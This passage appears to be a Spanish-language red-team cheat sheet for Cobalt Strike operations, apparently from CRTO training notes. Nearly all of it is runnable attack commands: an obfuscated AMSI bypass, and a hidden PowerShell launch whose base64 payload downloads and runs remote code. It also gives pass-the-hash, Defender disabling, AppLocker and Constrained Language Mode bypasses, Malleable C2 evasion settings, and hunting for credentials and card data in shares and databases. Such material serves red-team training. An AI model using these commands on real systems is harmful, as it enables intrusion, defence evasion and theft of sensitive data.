S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Behaviorural Detections
```r
# Para cambiar el proceso post-ex, utiliza el comando `spawnto`. Deben especificarse x86 y x64 individualmente y también se pueden usar variables de entorno.
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe

# Si luego usamos powerpick para obtener su propio nombre de proceso, devolverá dllhost.
beacon> powerpick Get-Process -Id $pid | select ProcessName

ProcessName
-----------
dllhost    

# NOTA: Al moverse lateralmente con psexec, Beacon intentará usar la configuración spawnto de tu perfil malleable C2. Sin embargo, no puede usar variables de entorno (como `%windir%`), por lo que recurrirá a rundll32 en esos casos. Puedes anular esto en tiempo de ejecución con el comando `ak-settings` para especificar una ruta absoluta en su lugar.

beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
```
## Parent/Child Relationships
```r
# Este es un ejemplo simple de generación de un proceso PowerShell oculto usando ShellWindows.
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0
```
## Command Line Detections
```r
# Detectado
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c

# No Detectado
beacon> mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
```

## Malleable C2 Profile 
```r
# Agregar esta configuración al profile
set tasks_max_size "2097152";

stage {
        set userwx "false";
        set cleanup "true";
        set obfuscate "true";
        set module_x64 "xpsservices.dll";
}

# Añadir justo arriba del bloque `http-get`:
# NOTA: `amsi_disable` solo se aplica a `powerpick`, `execute-assembly` y `psinject`. **No** se aplica al comando powershell.
# También puedes configurar el spawnto dentro de Malleable C2 Profile
post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}

# Luego verificar el perfil utilizando `C2Lint`
attacker@ubuntu> ./c2lint /cobaltstrike/c2-profiles/normal/webbug.profile
```

## Disable Defender
```r
# Deshabilitar Defender de una sesión powershell local
Get-MPPreference
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true
```

---
# Application Whitelisting
## Applocker
```r
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  

# Enumerar la política de AppLocker a través de GPO
beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol

PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol
```

## Policy Enumeration
```r
# Enumerar la política de AppLocker a través del registro local de Windows en la máquina Studio-DC
PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"

PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"

# Usando PowerShell en el sistema local
PS C:\Users\Administrator> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

## Writeable Paths
```r
# La navegación lateral a través de PSEXEC es viable, ya que el binario del servicio se carga en la ruta C:\Windows, la cual está permitida por defecto

# Encontrar una ruta escribible dentro de C:\Windows para evadir AppLocker
beacon> powershell Get-Acl C:\Windows\Tasks | fl
```

## Living Off The Lands Binaries Example
```r
# LOLBAS
# Usar **MSBuild** para ejecutar código C# desde un archivo **.csproj** o **.xml**
# Alojar **http_x64.xprocess.bin** a través de **Site Management > Host File**
# Iniciar la ejecución usando:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe test.csproj
[Referencia: https://dcollao.pages.dev/CRTO/25/O8m4/#living-off-the-land-binaries-scripts-and-libraries]

#Nota: Puedes usar `http_x64.xprocess.bin` aquí y alojarlo en el Cobalt Strike Team Server mediante _Site Management > Host File_.
```

## PowerShell CLM
```r
# Salir del PowerShell Constrained Language Mode utilizando un runspace no administrado 
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage

[Referencia: https://dcollao.pages.dev/CRTO/25/O8m4/#powershell-clm]

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe posh.csproj
```

## Beacon DLL
```r
# Beacon DLL (Las DLL generalmente no están restringidas por AppLocker debido a razones de rendimiento)
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```

---
## Data Exfiltration

## File Shares
```r
# Enumerar recursos compartidos
beacon> powerpick Invoke-ShareFinder
beacon> powerpick Invoke-FileFinder
beacon> powerpick Get-FileNetServer
beacon> shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
beacon> Get-DecryptedCpassword

# Encontrar recursos accesibles con información valiosa
beacon> powerpick Find-DomainShare -CheckShareAccess
beacon> powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
beacon> powerpick gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5
```

## Databases
```r
# Buscar datos sensibles en bases de datos directamente accesibles por palabras clave
beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize

# Buscar datos sensibles en enlaces de bases de datos
beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"

beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"
```